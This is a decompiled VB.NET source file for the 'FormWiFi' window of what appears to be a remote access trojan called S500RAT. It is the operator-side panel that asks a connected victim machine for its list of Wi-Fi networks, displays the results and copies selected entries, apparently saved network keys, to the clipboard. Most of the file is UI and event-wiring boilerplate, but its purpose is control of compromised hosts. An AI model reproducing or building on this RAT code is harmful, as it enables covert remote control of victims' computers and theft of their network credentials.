Imports System
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.Runtime.CompilerServices
Imports System.Threading
Imports System.Windows.Forms
Imports Guna.UI2.WinForms
Imports Guna.UI2.WinForms.Enums
Imports MessagePackLib.MessagePack
Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports S500RAT.My
Imports S500RAT.Server.Connection
Imports Sunny.UI

Namespace S500RAT
	' Token: 0x02000037 RID: 55
	<DesignerGenerated()>
	Public Partial Class FormWiFi
		Inherits Form

		' Token: 0x06000F83 RID: 3971 RVA: 0x000879C4 File Offset: 0x00085BC4
		Public Sub New()
			AddHandler MyBase.Load, AddressOf Me.FormWiFi_Load
			AddHandler MyBase.Resize, AddressOf Me.FormWiFi_Resize
			Me.FormSize = False
			Me.InitializeComponent()
		End Sub

		' Token: 0x17000655 RID: 1621
		' (get) Token: 0x06000F86 RID: 3974 RVA: 0x00088AB2 File Offset: 0x00086CB2
		' (set) Token: 0x06000F87 RID: 3975 RVA: 0x00088ABC File Offset: 0x00086CBC
		Friend Overridable Property Timer1 As System.Windows.Forms.Timer
			<CompilerGenerated()>
			Get
				Return Me._Timer1
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As System.Windows.Forms.Timer)
				Dim value2 As EventHandler = AddressOf Me.Timer1_Tick
				Dim timer As System.Windows.Forms.Timer = Me._Timer1
				If timer IsNot Nothing Then
					RemoveHandler timer.Tick, value2
				End If
				Me._Timer1 = value
				timer = Me._Timer1
				If timer IsNot Nothing Then
					AddHandler timer.Tick, value2
				End If
			End Set
		End Property

		' Token: 0x17000656 RID: 1622
		' (get) Token: 0x06000F88 RID: 3976 RVA: 0x00088AFF File Offset: 0x00086CFF
		' (set) Token: 0x06000F89 RID: 3977 RVA: 0x00088B09 File Offset: 0x00086D09
		Friend Overridable Property ControllContextMenuStrip As ContextMenuStrip

		' Token: 0x17000657 RID: 1623
		' (get) Token: 0x06000F8A RID: 3978 RVA: 0x00088B12 File Offset: 0x00086D12
		' (set) Token: 0x06000F8B RID: 3979 RVA: 0x00088B1C File Offset: 0x00086D1C
		Friend Overridable Property RefreshList As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._RefreshList
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.RefreshList_Click
				Dim refreshList As ToolStripMenuItem = Me._RefreshList
				If refreshList IsNot Nothing Then
					RemoveHandler refreshList.Click, value2
				End If
				Me._RefreshList = value
				refreshList = Me._RefreshList
				If refreshList IsNot Nothing Then
					AddHandler refreshList.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000658 RID: 1624
		' (get) Token: 0x06000F8C RID: 3980 RVA: 0x00088B5F File Offset: 0x00086D5F
		' (set) Token: 0x06000F8D RID: 3981 RVA: 0x00088B69 File Offset: 0x00086D69
		Friend Overridable Property ImageList1 As ImageList

		' Token: 0x17000659 RID: 1625
		' (get) Token: 0x06000F8E RID: 3982 RVA: 0x00088B72 File Offset: 0x00086D72
		' (set) Token: 0x06000F8F RID: 3983 RVA: 0x00088B7C File Offset: 0x00086D7C
		Friend Overridable Property UiLabel1 As UILabel

		' Token: 0x1700065A RID: 1626
		' (get) Token: 0x06000F90 RID: 3984 RVA: 0x00088B85 File Offset: 0x00086D85
		' (set) Token: 0x06000F91 RID: 3985 RVA: 0x00088B8F File Offset: 0x00086D8F
		Private Overridable Property ClientInfo As Label

		' Token: 0x1700065B RID: 1627
		' (get) Token: 0x06000F92 RID: 3986 RVA: 0x00088B98 File Offset: 0x00086D98
		' (set) Token: 0x06000F93 RID: 3987 RVA: 0x00088BA2 File Offset: 0x00086DA2
		Friend Overridable Property ListWifi As Guna2DataGridView

		' Token: 0x1700065C RID: 1628
		' (get) Token: 0x06000F94 RID: 3988 RVA: 0x00088BAB File Offset: 0x00086DAB
		' (set) Token: 0x06000F95 RID: 3989 RVA: 0x00088BB5 File Offset: 0x00086DB5
		Public Overridable Property WifiNum As Label

		' Token: 0x1700065D RID: 1629
		' (get) Token: 0x06000F96 RID: 3990 RVA: 0x00088BBE File Offset: 0x00086DBE
		' (set) Token: 0x06000F97 RID: 3991 RVA: 0x00088BC8 File Offset: 0x00086DC8
		Friend Overridable Property Guna2ResizeBox1 As Guna2ResizeBox

		' Token: 0x1700065E RID: 1630
		' (get) Token: 0x06000F98 RID: 3992 RVA: 0x00088BD1 File Offset: 0x00086DD1
		' (set) Token: 0x06000F99 RID: 3993 RVA: 0x00088BDB File Offset: 0x00086DDB
		Friend Overridable Property Guna2Elipse2 As Guna2Elipse

		' Token: 0x1700065F RID: 1631
		' (get) Token: 0x06000F9A RID: 3994 RVA: 0x00088BE4 File Offset: 0x00086DE4
		' (set) Token: 0x06000F9B RID: 3995 RVA: 0x00088BEE File Offset: 0x00086DEE
		Friend Overridable Property Guna2Elipse1 As Guna2Elipse

		' Token: 0x17000660 RID: 1632
		' (get) Token: 0x06000F9C RID: 3996 RVA: 0x00088BF7 File Offset: 0x00086DF7
		' (set) Token: 0x06000F9D RID: 3997 RVA: 0x00088C01 File Offset: 0x00086E01
		Friend Overridable Property Mini As ValleyMini

		' Token: 0x17000661 RID: 1633
		' (get) Token: 0x06000F9E RID: 3998 RVA: 0x00088C0A File Offset: 0x00086E0A
		' (set) Token: 0x06000F9F RID: 3999 RVA: 0x00088C14 File Offset: 0x00086E14
		Friend Overridable Property MAX As ValleyMax

		' Token: 0x17000662 RID: 1634
		' (get) Token: 0x06000FA0 RID: 4000 RVA: 0x00088C1D File Offset: 0x00086E1D
		' (set) Token: 0x06000FA1 RID: 4001 RVA: 0x00088C28 File Offset: 0x00086E28
		Friend Overridable Property ExitForm As ValleyClose
			<CompilerGenerated()>
			Get
				Return Me._ExitForm
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ValleyClose)
				Dim value2 As EventHandler = AddressOf Me.ExitForm_Click
				Dim exitForm As ValleyClose = Me._ExitForm
				If exitForm IsNot Nothing Then
					RemoveHandler exitForm.Click, value2
				End If
				Me._ExitForm = value
				exitForm = Me._ExitForm
				If exitForm IsNot Nothing Then
					AddHandler exitForm.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000663 RID: 1635
		' (get) Token: 0x06000FA2 RID: 4002 RVA: 0x00088C6B File Offset: 0x00086E6B
		' (set) Token: 0x06000FA3 RID: 4003 RVA: 0x00088C78 File Offset: 0x00086E78
		Friend Overridable Property ToolStripMenuItem1 As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._ToolStripMenuItem1
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.ToolStripMenuItem1_Click
				Dim toolStripMenuItem As ToolStripMenuItem = Me._ToolStripMenuItem1
				If toolStripMenuItem IsNot Nothing Then
					RemoveHandler toolStripMenuItem.Click, value2
				End If
				Me._ToolStripMenuItem1 = value
				toolStripMenuItem = Me._ToolStripMenuItem1
				If toolStripMenuItem IsNot Nothing Then
					AddHandler toolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000664 RID: 1636
		' (get) Token: 0x06000FA4 RID: 4004 RVA: 0x00088CBB File Offset: 0x00086EBB
		' (set) Token: 0x06000FA5 RID: 4005 RVA: 0x00088CC5 File Offset: 0x00086EC5
		Friend Overridable Property Column3 As DataGridViewImageColumn

		' Token: 0x17000665 RID: 1637
		' (get) Token: 0x06000FA6 RID: 4006 RVA: 0x00088CCE File Offset: 0x00086ECE
		' (set) Token: 0x06000FA7 RID: 4007 RVA: 0x00088CD8 File Offset: 0x00086ED8
		Friend Overridable Property Column4 As DataGridViewTextBoxColumn

		' Token: 0x17000666 RID: 1638
		' (get) Token: 0x06000FA8 RID: 4008 RVA: 0x00088CE1 File Offset: 0x00086EE1
		' (set) Token: 0x06000FA9 RID: 4009 RVA: 0x00088CEB File Offset: 0x00086EEB
		Friend Overridable Property Column5 As DataGridViewTextBoxColumn

		' Token: 0x17000667 RID: 1639
		' (get) Token: 0x06000FAA RID: 4010 RVA: 0x00088CF4 File Offset: 0x00086EF4
		' (set) Token: 0x06000FAB RID: 4011 RVA: 0x00088CFE File Offset: 0x00086EFE
		Friend Overridable Property Guna2DragControl1 As Guna2DragControl

		' Token: 0x17000668 RID: 1640
		' (get) Token: 0x06000FAC RID: 4012 RVA: 0x00088D07 File Offset: 0x00086F07
		' (set) Token: 0x06000FAD RID: 4013 RVA: 0x00088D11 File Offset: 0x00086F11
		Friend Overridable Property Guna2BorderlessForm1 As Guna2BorderlessForm

		' Token: 0x17000669 RID: 1641
		' (get) Token: 0x06000FAE RID: 4014 RVA: 0x00088D1A File Offset: 0x00086F1A
		' (set) Token: 0x06000FAF RID: 4015 RVA: 0x00088D24 File Offset: 0x00086F24
		Public Property Client As Clients

		' Token: 0x1700066A RID: 1642
		' (get) Token: 0x06000FB0 RID: 4016 RVA: 0x00088D2D File Offset: 0x00086F2D
		' (set) Token: 0x06000FB1 RID: 4017 RVA: 0x00088D37 File Offset: 0x00086F37
		Public Property F As FormS500

		' Token: 0x1700066B RID: 1643
		' (get) Token: 0x06000FB2 RID: 4018 RVA: 0x00088D40 File Offset: 0x00086F40
		' (set) Token: 0x06000FB3 RID: 4019 RVA: 0x00088D4A File Offset: 0x00086F4A
		Public Property FullPath As String

		' Token: 0x1700066C RID: 1644
		' (get) Token: 0x06000FB4 RID: 4020 RVA: 0x00088D53 File Offset: 0x00086F53
		' (set) Token: 0x06000FB5 RID: 4021 RVA: 0x00088D5D File Offset: 0x00086F5D
		Friend Property ParentClient As Clients

		' Token: 0x06000FB6 RID: 4022 RVA: 0x00088D68 File Offset: 0x00086F68
		Private Sub FormWiFi_Load(sender As Object, e As EventArgs)
			Me.ListWifi.ColumnHeadersDefaultCellStyle.BackColor = Color.FromArgb(26, 31, 55)
			Me.ListWifi.AlternatingRowsDefaultCellStyle.BackColor = Color.FromArgb(26, 31, 55)
			Me.ListWifi.AlternatingRowsDefaultCellStyle.BackColor = Color.FromArgb(26, 31, 55)
			Me.ListWifi.AlternatingRowsDefaultCellStyle.ForeColor = Color.FromArgb(255, 255, 255)
			Me.ListWifi.DefaultCellStyle.BackColor = Color.FromArgb(7, 11, 48)
			Me.ListWifi.DefaultCellStyle.ForeColor = Color.FromArgb(255, 255, 255)
			Me.ListWifi.DefaultCellStyle.SelectionBackColor = Color.FromArgb(47, 39, 134)
			Me.ListWifi.DefaultCellStyle.SelectionForeColor = Color.FromArgb(255, 255, 255)
			Me.ListWifi.CellBorderStyle = DataGridViewCellBorderStyle.[Single]
			Dim expression As String = Conversions.ToString(RuntimeHelpers.GetObjectValue(DataB.InfoClient(Me.ParentClient.L)))
			Try
				Me.ClientInfo.Text = String.Concat(New String() { Strings.Split(expression, "|'|", -1, CompareMethod.Binary)(1), " / ", Strings.Split(expression, "|'|", -1, CompareMethod.Binary)(2), " / ", Strings.Split(expression, "|'|", -1, CompareMethod.Binary)(3), " / ", Strings.Split(expression, "|'|", -1, CompareMethod.Binary)(4) })
			Catch ex As Exception
				Me.ClientInfo.Text = "Not found !"
			End Try
			Me.FormSize = True
			Me.MinimumSize = MyBase.Size
		End Sub

		' Token: 0x06000FB7 RID: 4023 RVA: 0x00088F5C File Offset: 0x0008715C
		Private Sub Timer1_Tick(sender As Object, e As EventArgs)
			Try
				Dim flag As Boolean = Not Me.ParentClient.TcpClient.Connected OrElse Not Me.Client.TcpClient.Connected
				If flag Then
					MyBase.Close()
				End If
			Catch ex As Exception
				MyBase.Close()
			End Try
		End Sub

		' Token: 0x06000FB8 RID: 4024 RVA: 0x00088FC8 File Offset: 0x000871C8
		Private Sub ExitForm_Click(sender As Object, e As EventArgs)
			ThreadPool.QueueUserWorkItem(Sub(o As Object)
				Dim client As Clients = Me.Client
				If client IsNot Nothing Then
					client.Disconnected()
				End If
				MyBase.Close()
			End Sub)
		End Sub

		' Token: 0x06000FB9 RID: 4025 RVA: 0x00088FE0 File Offset: 0x000871E0
		Private Sub FormWiFi_Resize(sender As Object, e As EventArgs)
			Dim flag As Boolean = Not Me.FormSize
			If flag Then
				Dim width As Integer = Screen.PrimaryScreen.Bounds.Width
				Dim height As Integer = Screen.PrimaryScreen.Bounds.Height
				Dim width2 As Integer = MyBase.Width
				Dim height2 As Integer = MyBase.Height
				Dim x As Integer = CInt(Math.Round(CDbl((width - width2)) / 2.0))
				Dim y As Integer = CInt(Math.Round(CDbl((height - height2)) / 2.0))
				MyBase.Location = New Point(x, y)
			End If
		End Sub

		' Token: 0x06000FBA RID: 4026 RVA: 0x00089074 File Offset: 0x00087274
		Private Sub RefreshList_Click(sender As Object, e As EventArgs)
			Dim msgPack As MsgPack = New MsgPack()
			msgPack.ForcePathObject("Packet").AsString = "FormWiFi"
			msgPack.ForcePathObject("Option").AsString = "List"
			ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
		End Sub

		' Token: 0x06000FBB RID: 4027 RVA: 0x000890D4 File Offset: 0x000872D4
		Private Sub ToolStripMenuItem1_Click(sender As Object, e As EventArgs)
			Dim flag As Boolean = Me.ListWifi.Rows.Count > 0
			If flag Then
				Try
					For Each obj As Object In Me.ListWifi.SelectedRows
						Dim dataGridViewRow As DataGridViewRow = CType(obj, DataGridViewRow)
						MyProject.Computer.Clipboard.SetText(Conversions.ToString(dataGridViewRow.Cells(2).Value))
					Next
				Catch ex As Exception
					Console.WriteLine(ex.Message)
				End Try
			End If
		End Sub

		' Token: 0x0400070E RID: 1806
		Private FormSize As Boolean
	End Class
End Namespace
